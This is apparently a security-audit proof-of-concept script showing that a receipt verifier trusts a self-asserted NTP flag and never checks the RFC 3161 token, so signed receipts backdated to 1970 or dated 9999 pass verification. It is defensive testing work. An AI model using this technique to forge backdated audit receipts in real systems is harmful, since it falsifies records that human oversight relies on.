#!/usr/bin/env python3
"""PoC 8 — Time is fully self-asserted: backdated and future receipts PASS.

verify_receipt checks only `ntp_synced is True` — a boolean the signer writes
about itself. There is no freshness window, no ordering check against the
chain, and rfc3161_token is never cryptographically verified (it is just
copied into signed bytes). The suite's A11 only tested ntp_synced=false.
A signer controlling the clock backdates freely. S2.9.
"""
import sys
sys.path.insert(0, "/home/user/workspace/governance-as-code/tools")
from receipt_lib import (generate_keypair, verify_receipt, canonical,
                         sha256_hex, sign, keyid, PREDICATE_TYPE)

sk, pk = generate_keypair()

def craft(predicate):
    stmt = {"predicateType": PREDICATE_TYPE,
            "subject": {"name": "prod:svc",
                        "digest": {"sha256": sha256_hex(canonical(predicate))}},
            "predicate": predicate}
    payload = canonical(stmt)
    stmt["signatures"] = [{"keyid": keyid(sk.public_key()),
                           "sig": sign(sk, PREDICATE_TYPE, payload)}]
    return stmt

BASE = {
    "action_id": "a-1",
    "actor": {"type": "human", "id": "s.lutar", "is_service_account": False,
              "auth_method": "hardware_key", "human_principal": "Stephen P. Lutar"},
    "policy_decision": {"result": "ALLOW"},
    "execution": {"status": "EXECUTED"},
    "evidence": {"items": [{"id": "log", "sha256": sha256_hex(b"x"), "present": True}],
                 "completeness": "COMPLETE", "redaction_commitments": []},
    "prev_chain_hash": "GENESIS",
}

def passes(pred):
    return verify_receipt(craft(pred), pk).verdict == "PASS"

# (a) Backdated to epoch, self-claiming NTP sync, carrying a garbage
#     "RFC 3161 token" that the verifier never opens.
p = dict(BASE)
p["timestamps"] = {"created": "1970-01-01T00:00:00+00:00",
                   "executed": "1970-01-01T00:00:00+00:00",
                   "ntp_synced": True, "rfc3161_token": "GARBAGE-NOT-A-TOKEN"}
backdated = passes(p)

# (b) Far-future timestamp.
p = dict(BASE)
p["timestamps"] = {"created": "9999-12-31T23:59:59+00:00",
                   "executed": "9999-12-31T23:59:59+00:00", "ntp_synced": True}
future = passes(p)

print("EXPLOIT-WORKS" if (backdated and future) else "HELD")
